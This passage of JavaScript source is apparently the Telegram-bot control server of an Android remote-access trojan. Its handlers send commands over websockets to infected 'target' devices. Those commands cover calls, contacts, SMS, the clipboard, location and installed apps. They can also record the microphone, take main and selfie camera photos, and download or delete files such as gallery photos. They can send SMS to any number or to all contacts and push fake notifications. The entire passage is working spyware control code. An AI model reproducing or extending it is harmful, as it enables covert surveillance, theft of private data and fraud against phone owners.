                    [
                        {text: 'ð˜¼ð™¥ð™¥ð™¨', callback_data: `apps:${uuid}`},
                        {text: 'ð˜¿ð™šð™«ð™žð™˜ð™š ð™žð™£ð™›ð™¤', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'ð™‚ð™šð™© ð™›ð™žð™¡ð™š', callback_data: `file:${uuid}`},
                        {text: 'ð˜¿ð™šð™¡ð™šð™©ð™š ð™›ð™žð™¡ð™š', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'ð˜¾ð™¡ð™žð™¥ð™—ð™¤ð™–ð™§ð™™', callback_data: `clipboard:${uuid}`},
                        {text: 'ð™ˆð™žð™˜ð™§ð™¤ð™¥ð™ð™¤ð™£ð™š', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'ð™ˆð™–ð™žð™£ ð™˜ð™–ð™¢ð™šð™§ð™–', callback_data: `camera_main:${uuid}`},
                        {text: 'ð™Žð™šð™¡ð™›ð™žð™š ð™˜ð™–ð™¢ð™šð™§ð™–', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'ð™‡ð™¤ð™˜ð™–ð™©ð™žð™¤ð™£', callback_data: `location:${uuid}`},
                        {text: 'ð™ð™¤ð™–ð™¨ð™©', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'ð˜¾ð™–ð™¡ð™¡ð™¨', callback_data: `calls:${uuid}`},
                        {text: 'ð˜¾ð™¤ð™£ð™©ð™–ð™˜ð™©ð™¨', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'ð™‘ð™žð™—ð™§ð™–ð™©ð™š', callback_data: `vibrate:${uuid}`},
                        {text: 'ð™Žð™ð™¤ð™¬ ð™£ð™¤ð™©ð™žð™›ð™žð™˜ð™–ð™©ð™žð™¤ð™£', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'ð™ˆð™šð™¨ð™¨ð™–ð™œð™šð™¨', callback_data: `messages:${uuid}`},
                        {text: 'ð™Žð™šð™£ð™™ ð™¢ð™šð™¨ð™¨ð™–ð™œð™š', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'ð™‹ð™¡ð™–ð™® ð™–ð™ªð™™ð™žð™¤', callback_data: `play_audio:${uuid}`},
                        {text: 'ð™Žð™©ð™¤ð™¥ ð™–ð™ªð™™ð™žð™¤', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: 'ð™Žð™šð™£ð™™ ð™¢ð™šð™¨ð™¨ð™–ð™œð™š ð™©ð™¤ ð™–ð™¡ð™¡ ð™˜ð™¤ð™£ð™©ð™–ð™˜ð™©ð™¨',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
            'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
            'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
            'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
            'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
            'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
            'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
            'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
            'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
            'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
            'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™”ð™¤ð™ªð™§ ð™§ð™šð™¦ð™ªð™šð™¨ð™© ð™žð™¨ ð™¤ð™£ ð™¥ð™§ð™¤ð™˜ð™šð™¨ð™¨\n\n' +
            'â€¢ Êá´á´œ á´¡ÉªÊŸÊŸ Ê€á´‡á´„á´‡Éªá´ á´‡ á´€ Ê€á´‡êœ±á´˜á´É´êœ±á´‡ ÉªÉ´ á´›Êœá´‡ É´á´‡xá´› êœ°á´‡á´¡ á´á´á´á´‡É´á´›êœ±',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ð˜¾ð™¤ð™£ð™£ð™šð™˜ð™©ð™šð™™ ð™™ð™šð™«ð™žð™˜ð™šð™¨"], ["ð™€ð™­ð™šð™˜ð™ªð™©ð™š ð™˜ð™¤ð™¢ð™¢ð™–ð™£ð™™"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, 'Â°â€¢ ð™‹ð™¡ð™šð™–ð™¨ð™š ð™§ð™šð™¥ð™¡ð™® ð™©ð™ð™š ð™£ð™ªð™¢ð™—ð™šð™§ ð™©ð™¤ ð™¬ð™ð™žð™˜ð™ ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™¨ð™šð™£ð™™ ð™©ð™ð™š ð™Žð™ˆð™Ž\n\n' +
            'â€¢Éªêœ° Êá´á´œ á´¡á´€É´á´› á´›á´ êœ±á´‡É´á´… êœ±á´êœ± á´›á´ ÊŸá´á´„á´€ÊŸ á´„á´á´œÉ´á´›Ê€Ê É´á´œá´Ê™á´‡Ê€êœ±, Êá´á´œ á´„á´€É´ á´‡É´á´›á´‡Ê€ á´›Êœá´‡ É´á´œá´Ê™á´‡Ê€ á´¡Éªá´›Êœ á´¢á´‡Ê€á´ á´€á´› á´›Êœá´‡ Ê™á´‡É¢ÉªÉ´É´ÉªÉ´É¢, á´á´›Êœá´‡Ê€á´¡Éªêœ±á´‡ á´‡É´á´›á´‡Ê€ á´›Êœá´‡ É´á´œá´Ê™á´‡Ê€ á´¡Éªá´›Êœ á´›Êœá´‡ á´„á´á´œÉ´á´›Ê€Ê á´„á´á´…á´‡',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™€ð™£ð™©ð™šð™§ ð™©ð™ð™š ð™¢ð™šð™¨ð™¨ð™–ð™œð™š ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™¨ð™šð™£ð™™ ð™©ð™¤ ð™–ð™¡ð™¡ ð™˜ð™¤ð™£ð™©ð™–ð™˜ð™©ð™¨\n\n' +
            'â€¢ Ê™á´‡ á´„á´€Ê€á´‡êœ°á´œÊŸ á´›Êœá´€á´› á´›Êœá´‡ á´á´‡êœ±êœ±á´€É¢á´‡ á´¡ÉªÊŸÊŸ É´á´á´› Ê™á´‡ êœ±á´‡É´á´› Éªêœ° á´›Êœá´‡ É´á´œá´Ê™á´‡Ê€ á´êœ° á´„Êœá´€Ê€á´€á´„á´›á´‡Ê€êœ± ÉªÉ´ Êá´á´œÊ€ á´á´‡êœ±êœ±á´€É¢á´‡ Éªêœ± á´á´Ê€á´‡ á´›Êœá´€É´ á´€ÊŸÊŸá´á´¡á´‡á´…',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™€ð™£ð™©ð™šð™§ ð™©ð™ð™š ð™¥ð™–ð™©ð™ ð™¤ð™› ð™©ð™ð™š ð™›ð™žð™¡ð™š ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™™ð™¤ð™¬ð™£ð™¡ð™¤ð™–ð™™\n\n' +
            'â€¢ Êá´á´œ á´…á´ É´á´á´› É´á´‡á´‡á´… á´›á´ á´‡É´á´›á´‡Ê€ á´›Êœá´‡ êœ°á´œÊŸÊŸ êœ°ÉªÊŸá´‡ á´˜á´€á´›Êœ, á´Šá´œêœ±á´› á´‡É´á´›á´‡Ê€ á´›Êœá´‡ á´á´€ÉªÉ´ á´˜á´€á´›Êœ. êœ°á´Ê€ á´‡xá´€á´á´˜ÊŸá´‡, á´‡É´á´›á´‡Ê€<b> DCIM/Camera </b> á´›á´ Ê€á´‡á´„á´‡Éªá´ á´‡ É¢á´€ÊŸÊŸá´‡Ê€Ê êœ°ÉªÊŸá´‡êœ±.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™€ð™£ð™©ð™šð™§ ð™©ð™ð™š ð™¥ð™–ð™©ð™ ð™¤ð™› ð™©ð™ð™š ð™›ð™žð™¡ð™š ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™™ð™šð™¡ð™šð™©ð™š\n\n' +
            'â€¢ Êá´á´œ á´…á´ É´á´á´› É´á´‡á´‡á´… á´›á´ á´‡É´á´›á´‡Ê€ á´›Êœá´‡ êœ°á´œÊŸÊŸ êœ°ÉªÊŸá´‡ á´˜á´€á´›Êœ, á´Šá´œêœ±á´› á´‡É´á´›á´‡Ê€ á´›Êœá´‡ á´á´€ÉªÉ´ á´˜á´€á´›Êœ. êœ°á´Ê€ á´‡xá´€á´á´˜ÊŸá´‡, á´‡É´á´›á´‡Ê€<b> DCIM/Camera </b> á´›á´ á´…á´‡ÊŸá´‡á´›á´‡ É¢á´€ÊŸÊŸá´‡Ê€Ê êœ°ÉªÊŸá´‡êœ±.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™€ð™£ð™©ð™šð™§ ð™ð™¤ð™¬ ð™¡ð™¤ð™£ð™œ ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™ð™š ð™¢ð™žð™˜ð™§ð™¤ð™¥ð™ð™¤ð™£ð™š ð™©ð™¤ ð™—ð™š ð™§ð™šð™˜ð™¤ð™§ð™™ð™šð™™\n\n' +
            'â€¢ É´á´á´›á´‡ á´›Êœá´€á´› Êá´á´œ á´á´œêœ±á´› á´‡É´á´›á´‡Ê€ á´›Êœá´‡ á´›Éªá´á´‡ É´á´œá´á´‡Ê€Éªá´„á´€ÊŸÊŸÊ ÉªÉ´ á´œÉ´Éªá´›êœ± á´êœ° êœ±á´‡á´„á´É´á´…êœ±',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™€ð™£ð™©ð™šð™§ ð™©ð™ð™š ð™¢ð™šð™¨ð™¨ð™–ð™œð™š ð™©ð™ð™–ð™© ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™–ð™¥ð™¥ð™šð™–ð™§ ð™¤ð™£ ð™©ð™ð™š ð™©ð™–ð™§ð™œð™šð™© ð™™ð™šð™«ð™žð™˜ð™š\n\n' +
            'â€¢ á´›á´á´€êœ±á´› Éªêœ± á´€ êœ±Êœá´Ê€á´› á´á´‡êœ±êœ±á´€É¢á´‡ á´›Êœá´€á´› á´€á´˜á´˜á´‡á´€Ê€êœ± á´É´ á´›Êœá´‡ á´…á´‡á´ Éªá´„á´‡ êœ±á´„Ê€á´‡á´‡É´ êœ°á´Ê€ á´€ êœ°á´‡á´¡ êœ±á´‡á´„á´É´á´…êœ±',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™€ð™£ð™©ð™šð™§ ð™©ð™ð™š ð™¢ð™šð™¨ð™¨ð™–ð™œð™š ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™–ð™¥ð™¥ð™šð™–ð™§ ð™–ð™¨ ð™£ð™¤ð™©ð™žð™›ð™žð™˜ð™–ð™©ð™žð™¤ð™£\n\n' +
            'â€¢ Êá´á´œÊ€ á´á´‡êœ±êœ±á´€É¢á´‡ á´¡ÉªÊŸÊŸ Ê™á´‡ á´€á´˜á´˜á´‡á´€Ê€ ÉªÉ´ á´›á´€Ê€É¢á´‡á´› á´…á´‡á´ Éªá´„á´‡ êœ±á´›á´€á´›á´œêœ± Ê™á´€Ê€ ÊŸÉªá´‹á´‡ Ê€á´‡É¢á´œÊŸá´€Ê€ É´á´á´›Éªêœ°Éªá´„á´€á´›Éªá´É´',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            'Â°â€¢ ð™€ð™£ð™©ð™šð™§ ð™©ð™ð™š ð™–ð™ªð™™ð™žð™¤ ð™¡ð™žð™£ð™  ð™®ð™¤ð™ª ð™¬ð™–ð™£ð™© ð™©ð™¤ ð™¥ð™¡ð™–ð™®\n\n' +
            'â€¢ É´á´á´›á´‡ á´›Êœá´€á´› Êá´á´œ á´á´œêœ±á´› á´‡É´á´›á´‡Ê€ á´›Êœá´‡ á´…ÉªÊ€á´‡á´„á´› ÊŸÉªÉ´á´‹ á´êœ° á´›Êœá´‡ á´…á´‡êœ±ÉªÊ€á´‡á´… êœ±á´á´œÉ´á´…, á´á´›Êœá´‡Ê€á´¡Éªêœ±á´‡ á´›Êœá´‡ êœ±á´á´œÉ´á´… á´¡ÉªÊŸÊŸ É´á´á´› Ê™á´‡ á´˜ÊŸá´€Êá´‡á´…',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);